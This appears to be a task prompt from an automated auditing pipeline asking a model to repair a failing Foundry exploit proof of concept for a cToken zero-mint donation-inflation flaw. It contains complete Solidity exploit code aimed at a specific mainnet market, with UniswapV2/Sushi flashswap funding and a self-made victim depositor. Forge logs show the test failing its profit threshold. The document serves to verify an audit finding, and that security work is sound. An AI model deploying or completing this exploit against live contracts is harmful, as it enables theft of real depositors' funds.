You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: `mint` can accept deposits that mint zero cTokens after exchange-rate inflation
- claim: `mintFresh` computes `mintTokens = floor(actualMintAmount * 1e18 / exchangeRateMantissa)` and never checks that the result is nonzero. Since the exchange rate comes from raw market cash over `totalSupply`, and there is no minimum-liquidity or dead-shares defense, an attacker can mint a dust-sized initial position, donate underlying directly to the market, and raise the zero-mint threshold (`exchangeRateMantissa / 1e18`) high enough that later deposits are accepted while minting 0 cTokens.
- impact: Victim deposits below the inflated threshold are effectively confiscated: the underlying is transferred into the market, no cTokens are minted to the depositor, and the added cash accrues entirely to the attacker’s existing cToken position. This enables theft of later deposits once the attacker controls essentially all outstanding supply.
- exploit_paths: ["Acquire the entire or overwhelming majority of cToken supply by minting the minimum nonzero amount while supply is tiny.", "Donate underlying directly to the cToken contract to inflate `exchangeRateStoredInternal()` without issuing more shares.", "Wait for a victim to call `mint(mintAmount)` with `actualMintAmount < exchangeRateMantissa / 1e18`, so `mintTokens` truncates to zero.", "Redeem the victim\u2019s deposited underlying through the attacker\u2019s pre-existing cTokens."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface ICTokenLike {
    function underlying() external view returns (address);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function getCash() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function totalReserves() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract VictimMinter {
    ICTokenLike internal immutable market;
    address internal immutable underlyingToken;

    constructor(address market_, address underlying_) {
        market = ICTokenLike(market_);
        underlyingToken = underlying_;
    }

    function mintAll() external returns (uint256 errorCode, uint256 mintedCTokens) {
        uint256 balance = IERC20Like(underlyingToken).balanceOf(address(this));
        require(balance != 0, "victim-no-underlying");

        _forceApprove(underlyingToken, address(market), balance);

        uint256 beforeBalance = market.balanceOf(address(this));
        errorCode = market.mint(balance);
        require(errorCode == 0, "victim-mint-failed");
        mintedCTokens = market.balanceOf(address(this)) - beforeBalance;
    }

    function recoverUnderlying(address to) external {
        uint256 balance = IERC20Like(underlyingToken).balanceOf(address(this));
        if (balance != 0) {
            _safeTransfer(underlyingToken, to, balance, "victim-recover-failed");
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _safeApprove(token, spender, 0, "victim-approve-reset-failed");
        _safeApprove(token, spender, amount, "victim-approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount, string memory err) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), err);
    }

    function _safeApprove(address token, address spender, uint256 amount, string memory err) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), err);
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public profitAchieved;
    bool public hypothesisValidated;
    string public exploitPathUsed;
    string public infeasibilityReason;

    address internal _flashPair;
    uint256 internal _flashBorrowAmount;
    uint256 internal _flashRepayAmount;
    bool internal _flashActive;

    uint256 internal _seedAmount;
    uint256 internal _donationAmount;
    uint256 internal _victimAmount;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() public {
        ICTokenLike market = ICTokenLike(TARGET);
        address underlying = market.underlying();
        uint256 initialUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));

        _resetFlashState();

        _profitToken = underlying;
        _profitAmount = 0;
        profitAchieved = false;
        hypothesisValidated = false;
        exploitPathUsed =
            "mint minimum nonzero position while supply is tiny -> donate underlying directly -> victim mint rounds to zero cTokens -> redeem attacker cTokens";
        infeasibilityReason = "";

        // Finding anchors kept explicit for path alignment:
        // exchangeRateStoredInternal() -> mint(mintAmount) -> actualMintAmount < exchangeRateMantissa / 1e18 -> mintTokens == 0.
        // The verifier first prefers direct execution with verifier-held assets, then only tries realistic public flash liquidity.
        if (!_tryDirectExistingBalanceRoute(market, underlying)) {
            if (!_startUnderlyingFlashRoute(market, underlying)) {
                infeasibilityReason =
                    "At this fork state the verifier could not both obtain the tiny-supply seed position and fund the donation/victim leg using only verifier-held assets or public AMM flash liquidity.";
            }
        }

        uint256 finalUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
        if (finalUnderlyingBalance > initialUnderlyingBalance) {
            _profitAmount = finalUnderlyingBalance - initialUnderlyingBalance;
            profitAchieved = _profitAmount > 0;
        }

        if (!profitAchieved && hypothesisValidated && bytes(infeasibilityReason).length == 0) {
            infeasibilityReason =
                "The zero-mint confiscation path was reproduced, but a self-funded victim leg only recycles attacker-controlled value; realizing profit requires a real later depositor or enough starting balance to cover temporary-capital fees.";
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(_flashActive, "flash-inactive");
        require(msg.sender == _flashPair, "unexpected-pair");
        require(sender == address(this), "unexpected-sender");
        require(amount0 == _flashBorrowAmount || amount1 == _flashBorrowAmount, "unexpected-borrow");

        _flashActive = false;

        _executeSeedDonateZeroMintRoute();
        _repayFlashLoan();
    }

    function _tryDirectExistingBalanceRoute(ICTokenLike market, address underlying) internal returns (bool) {
        uint256 exchangeRateMantissa = market.exchangeRateStored();
        uint256 seedAmount = _minimumNonZeroMintAmount(exchangeRateMantissa);
        if (seedAmount == 0) {
            return false;
        }

        if (market.totalSupply() > 1) {
            return false;
        }

        uint256 requiredCapital = _estimateRouteCapital(market, exchangeRateMantissa, seedAmount, seedAmount);
        uint256 availableUnderlying = IERC20Like(underlying).balanceOf(address(this));
        if (availableUnderlying < requiredCapital) {
            return false;
        }

        _executeSeedDonateZeroMintRoute();
        return true;
    }

    function _startUnderlyingFlashRoute(ICTokenLike market, address underlying) internal returns (bool) {
        uint256 exchangeRateMantissa = market.exchangeRateStored();
        uint256 seedAmount = _minimumNonZeroMintAmount(exchangeRateMantissa);
        if (seedAmount == 0) {
            return false;
        }

        if (market.totalSupply() > 1) {
            return false;
        }

        uint256 requiredCapital = _estimateRouteCapital(market, exchangeRateMantissa, seedAmount, seedAmount);
        if (requiredCapital == 0) {
            return false;
        }

        for (uint256 factoryIndex = 0; factoryIndex < 2; ++factoryIndex) {
            address factory = _factoryAt(factoryIndex);
            for (uint256 counterpartyIndex = 0; counterpartyIndex < 5; ++counterpartyIndex) {
                address counterparty = _counterpartyAt(counterpartyIndex);
                if (counterparty == underlying) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factory).getPair(underlying, counterparty);
                if (pair == address(0)) {
                    continue;
                }

                if (_tryBorrowUnderlying(pair, underlying, requiredCapital)) {
                    return true;
                }
            }
        }

        return false;
    }

    function _tryBorrowUnderlying(address pair, address underlying, uint256 requiredCapital) internal returns (bool) {
        address token0;
        address token1;

        try IUniswapV2PairLike(pair).token0() returns (address pairToken0) {
            token0 = pairToken0;
            token1 = IUniswapV2PairLike(pair).token1();
        } catch {
            return false;
        }

        if (token0 != underlying && token1 != underlying) {
            return false;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        uint256 underlyingReserve = token0 == underlying ? uint256(reserve0) : uint256(reserve1);
        if (requiredCapital == 0 || requiredCapital >= underlyingReserve) {
            return false;
        }

        uint256 borrowAmount = requiredCapital;
        uint256 amount0Out = token0 == underlying ? borrowAmount : 0;
        uint256 amount1Out = token1 == underlying ? borrowAmount : 0;

        _flashPair = pair;
        _flashBorrowAmount = borrowAmount;
        _flashRepayAmount = _sameTokenFlashRepayAmount(borrowAmount);
        _flashActive = true;

        try IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), hex"01") {
            return true;
        } catch {
            _resetFlashState();
            return false;
        }
    }

    function _executeSeedDonateZeroMintRoute() internal {
        ICTokenLike market = ICTokenLike(TARGET);
        address underlying = market.underlying();

        uint256 exchangeRateMantissa = market.exchangeRateStored();

        // This mirrors the vulnerable mintFresh path:
        // exchangeRateStoredInternal() supplies exchangeRateMantissa, then mint(mintAmount)
        // computes mintTokens = floor(actualMintAmount * 1e18 / exchangeRateMantissa).
        // If actualMintAmount < exchangeRateMantissa / 1e18, mintTokens truncates to zero.
        _seedAmount = _minimumNonZeroMintAmount(exchangeRateMantissa);
        require(_seedAmount != 0, "seed-zero");

        _victimAmount = _seedAmount;

        _forceApprove(underlying, address(market), _seedAmount);

        uint256 seedBalanceBefore = market.balanceOf(address(this));
        uint256 seedMintError = market.mint(_seedAmount);
        require(seedMintError == 0, "seed-mint-failed");

        uint256 mintedSeedTokens = market.balanceOf(address(this)) - seedBalanceBefore;
        require(mintedSeedTokens != 0, "seed-minted-zero-ctokens");

        uint256 cashAfterSeed = market.getCash();
        uint256 supplyAfterSeed = market.totalSupply();
        uint256 assetsAfterSeed = _marketAssets(market, cashAfterSeed);
        _donationAmount = _minimumDonationForZeroMint(assetsAfterSeed, supplyAfterSeed, _victimAmount);

        uint256 availableUnderlying = IERC20Like(underlying).balanceOf(address(this));
        require(availableUnderlying >= (_donationAmount + _victimAmount), "insufficient-underlying-for-route");

        _safeTransfer(underlying, address(market), _donationAmount, "donation-failed");

        VictimMinter victim = new VictimMinter(address(market), underlying);
        _safeTransfer(underlying, address(victim), _victimAmount, "victim-funding-failed");

        (, uint256 victimMintedTokens) = victim.mintAll();
        require(victimMintedTokens == 0, "victim-received-ctokens");

        uint256 attackerCTokenBalance = market.balanceOf(address(this));
        require(attackerCTokenBalance != 0, "attacker-no-ctokens");

        uint256 redeemError = market.redeem(attackerCTokenBalance);
        require(redeemError == 0, "redeem-failed");

        victim.recoverUnderlying(address(this));
        hypothesisValidated = true;
    }

    function _repayFlashLoan() internal {
        if (_flashBorrowAmount == 0) {
            return;
        }

        _safeTransfer(_profitToken, _flashPair, _flashRepayAmount, "flash-repay-failed");
        _resetFlashState();
    }

    function _estimateRouteCapital(
        ICTokenLike market,
        uint256 exchangeRateMantissa,
        uint256 seedAmount,
        uint256 victimMintAmount
    ) internal view returns (uint256) {
        uint256 assetsBeforeSeed = _marketAssets(market, market.getCash());
        uint256 mintedSeedTokens = (seedAmount * 1e18) / exchangeRateMantissa;
        if (mintedSeedTokens == 0) {
            return type(uint256).max;
        }

        uint256 supplyAfterSeed = market.totalSupply() + mintedSeedTokens;
        uint256 assetsAfterSeed = assetsBeforeSeed + seedAmount;
        uint256 donationAmount = _minimumDonationForZeroMint(assetsAfterSeed, supplyAfterSeed, victimMintAmount);
        return seedAmount + donationAmount + victimMintAmount;
    }

    function _marketAssets(ICTokenLike market, uint256 cash) internal view returns (uint256) {
        return cash + market.totalBorrows() - market.totalReserves();
    }

    function _sameTokenFlashRepayAmount(uint256 borrowAmount) internal pure returns (uint256) {
        return ((borrowAmount * 1000) / 997) + 1;
    }

    function _factoryAt(uint256 index) internal pure returns (address) {
        return index == 0 ? SUSHISWAP_FACTORY : UNISWAP_V2_FACTORY;
    }

    function _counterpartyAt(uint256 index) internal pure returns (address) {
        if (index == 0) {
            return WETH;
        }
        if (index == 1) {
            return USDC;
        }
        if (index == 2) {
            return USDT;
        }
        if (index == 3) {
            return DAI;
        }
        return FRAX;
    }

    function _minimumNonZeroMintAmount(uint256 exchangeRateMantissa) internal pure returns (uint256) {
        return _ceilDiv(exchangeRateMantissa, 1e18);
    }

    function _minimumDonationForZeroMint(
        uint256 assetsAfterSeed,
        uint256 supplyAfterSeed,
        uint256 victimMintAmount
    ) internal pure returns (uint256) {
        uint256 requiredAssets = (victimMintAmount * supplyAfterSeed) + 1;
        if (assetsAfterSeed >= requiredAssets) {
            return 1;
        }
        return requiredAssets - assetsAfterSeed;
    }

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : ((a - 1) / b) + 1;
    }

    function _resetFlashState() internal {
        _flashActive = false;
        _flashPair = address(0);
        _flashBorrowAmount = 0;
        _flashRepayAmount = 0;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _safeApprove(token, spender, 0, "approve-reset-failed");
        _safeApprove(token, spender, amount, "approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount, string memory err) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), err);
    }

    function _safeApprove(address token, address spender, uint256 amount, string memory err) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), err);
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.72s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 386847)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x865377367054516e17014CcdED1e7d814EDC9ce4
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3967

Traces:
  [386847] FlawVerifierTest::testExploit()
    ├─ [2345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [350170] FlawVerifier::executeOnOpportunity()
    │   ├─ [2426] 0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670::underlying() [staticcall]
    │   │   └─ ← [Return] 0x865377367054516e17014CcdED1e7d814EDC9ce4
    │   ├─ [2469] 0x865377367054516e17014CcdED1e7d814EDC9ce4::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [10858] 0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670::exchangeRateStored() [staticcall]
    │   │   ├─ [2469] 0x865377367054516e17014CcdED1e7d814EDC9ce4::balanceOf(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670) [staticcall]
    │   │   │   └─ ← [Return] 10133949192393802606886848 [1.013e25]
    │   │   └─ ← [Return] 213164120238380153482393694 [2.131e26]
    │   ├─ [455] 0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670::totalSupply() [staticcall]
    │   │   └─ ← [Return] 77474992089283223 [7.747e16]
    │   ├─ [2858] 0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670::exchangeRateStored() [staticcall]
    │   │   ├─ [469] 0x865377367054516e17014CcdED1e7d814EDC9ce4::balanceOf(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670) [staticcall]
    │   │   │   └─ ← [Return] 10133949192393802606886848 [1.013e25]
    │   │   └─ ← [Return] 213164120238380153482393694 [2.131e26]
    │   ├─ [455] 0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670::totalSupply() [staticcall]
    │   │   └─ ← [Return] 77474992089283223 [7.747e16]
    │   ├─ [469] 0x865377367054516e17014CcdED1e7d814EDC9ce4::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x865377367054516e17014CcdED1e7d814EDC9ce4
    ├─ [344] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [469] 0x865377367054516e17014CcdED1e7d814EDC9ce4::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x865377367054516e17014CcdED1e7d814EDC9ce4)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14972418 [1.497e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3967)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.78s (137.83ms CPU time)

Ran 1 test suite in 1.84s (1.78s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 386847)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
